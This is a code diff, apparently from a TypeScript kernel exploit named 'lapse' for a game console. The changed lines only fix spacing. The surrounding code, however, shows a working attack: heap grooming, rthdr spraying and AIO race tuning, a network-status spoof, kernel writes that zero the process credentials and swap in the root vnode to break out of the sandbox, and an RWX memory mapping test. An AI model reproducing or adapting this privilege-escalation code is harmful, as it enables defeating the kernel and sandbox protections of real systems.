@@ -27,14 +27,14 @@ const PAGE_SIZE = 0x4000
 const MAIN_CORE = 4
 const MAIN_RTPRIO = 0x100
 const NUM_WORKERS = 4          // was 2   — more AIO blocking workers
-const NUM_GROOMS  = 0x300      // was 0x200 — larger heap groom
+const NUM_GROOMS = 0x300      // was 0x200 — larger heap groom
 const NUM_HANDLES = 0x180      // was 0x100 — more evf handles for better aliasing
-const NUM_SDS     = 96         // was 64   — bigger rthdr spray
+const NUM_SDS = 96         // was 64   — bigger rthdr spray
 const NUM_SDS_ALT = 72         // was 48   — ditto for alt set
-const NUM_RACES   = 200        // was 100  — more AIO race attempts
-const NUM_ALIAS   = 200        // was 100  — more alias search loops
-const LEAK_LEN    = 16
-const NUM_LEAKS   = 64         // was 32   — more leak slots
+const NUM_RACES = 200        // was 100  — more AIO race attempts
+const NUM_ALIAS = 200        // was 100  — more alias search loops
+const LEAK_LEN = 16
+const NUM_LEAKS = 64         // was 32   — more leak slots
 const NUM_CLOBBERS = 16        // was 8    — more clobber attempts
 const MAX_AIO_IDS = 0x100      // was 0x80 — larger AIO id pool
 const MAX_FULL_RESTARTS_LAPSE = 4  // full teardown+reinit cycles
@@ -715,9 +715,9 @@ function make_aliased_rthdrs (sds: BigInt[]): [BigInt, BigInt] | null {
 // ---------------------------------------------------------------------------
 const SIOCGIFFLAGS_LAPSE = 0xC0206911
 const SIOCSIFFLAGS_LAPSE = 0x80206910
-const IFF_UP_LAPSE       = 0x0001
-const IFF_RUNNING_LAPSE  = 0x0040
-const IFREQ_SIZE_LAPSE   = 32
+const IFF_UP_LAPSE = 0x0001
+const IFF_RUNNING_LAPSE = 0x0040
+const IFREQ_SIZE_LAPSE = 32
 
 function spoof_network_connected_lapse () {
   try {
@@ -2078,7 +2078,7 @@ export function lapse () {
       log('[*] BEFORE: uid=' + uid_before + ' sandbox=' + sandbox_before)
 
       const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))!
-      const ucred   = kernel.read_qword(proc.add(OFFSET_P_UCRED))!
+      const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))!
 
       kernel.write_dword(ucred.add(0x04), 0)
       kernel.write_dword(ucred.add(0x08), 0)
@@ -2095,7 +2095,7 @@ export function lapse () {
       kernel.write_qword(proc_fd.add(0x10), rootvnode)
       kernel.write_qword(proc_fd.add(0x18), rootvnode)
 
-      const uid_after     = Number(getuid())
+      const uid_after = Number(getuid())
       const sandbox_after = Number(is_in_sandbox())
       log('[*] AFTER:  uid=' + uid_after + ' sandbox=' + sandbox_after)
 
@@ -2127,8 +2127,8 @@ export function lapse () {
         }
 
         try {
-          const PROT_RWX  = 0x7
-          const MAP_ANON  = 0x1000
+          const PROT_RWX = 0x7
+          const MAP_ANON = 0x1000
           const MAP_PRIVATE = 0x2
           const test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0)
           if (Number(test_addr.shr(32)) < 0xffff8000) {
@@ -2153,13 +2153,11 @@ export function lapse () {
 
       cleanup()
       return true
-
     } // end restart loop
 
     lapseLog('[✗] All restart attempts exhausted — reboot and try again')
     send_notification('[VAF-Lapse] Failed — please reboot')
     return false
-
   } catch (e) {
     lapseLog('[✗] Fatal error: ' + (e as Error).message)
     utils.notify('[VAF-Lapse] Fatal error — reboot and try again')
